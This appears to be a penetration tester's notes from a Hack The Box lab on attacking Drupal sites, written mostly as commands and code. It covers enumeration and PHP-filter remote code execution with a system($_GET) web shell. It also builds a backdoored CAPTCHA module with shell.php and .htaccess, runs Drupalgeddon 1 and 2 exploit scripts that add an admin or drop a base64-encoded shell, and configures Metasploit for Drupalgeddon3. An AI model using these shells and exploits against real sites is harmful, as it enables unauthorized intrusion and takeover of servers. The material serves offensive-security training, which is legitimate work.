### Footprinting + Enumeration
```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
curl -s http://drupal.inlanefreight.local/node/1
```
> [!NOTE] Note
> Not every Drupal installation will look the same or display the login page or even allow users to access the login page from the internet.

Trying this against the latest Drupal version will give a 404
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

### Exploitation
##### RCE before version 8.0
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
![](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)

`Save configuration` -> `Content` -> `Add content` -> `Basic page`

Slap this bad boy in there (**avoid driveby shooters by using md5 hash**) and make sure the`Text format` drop-down is set to `PHP code`
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
Node number may vary
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
##### RCE 8.0 and up
From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first.
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Install the plugin (may be under the `Extend menu` depending on the Drupal version)

`Administration` -> `Reports` -> `Available updates` -> `Browse` -> Install

From there we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7. **Be sure to select `PHP code` from the `Text format` dropdown**

##### Uploading a Backdoor Module
Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). 
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
Create a webshell
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```
Create a `.htaccess` file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
Copy both files to the captcha folder and tar it up
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
Install: `Manage` -> `Extend` -> `+ Install new module` -> `Upload and Install`
Exploit
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

##### Known Vulnerabilities
###### [Drupalgeddon1](https://www.exploit-db.com/exploits/34992) 
This allows us to add a new admin user from an unauthenticated standpoint
```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u adot -p pwnd
```

###### [Drupalgeddon2](https://www.exploit-db.com/exploits/44448)
This allows for RCE
```bash
python3 drupalgeddon2.py 

curl -s http://drupal-dev.inlanefreight.local/hello.txt
```
Update script payload
```php
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
echo "PD9waHAgc<snip>" | base64 -d | tee adot8.php
```

```bash
curl http://drupal-dev.inlanefreight.local/adot8.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

##### [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)
This is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.
```bash
multi/http/drupal_drupageddon3

msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 
```


Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
    
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
    
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

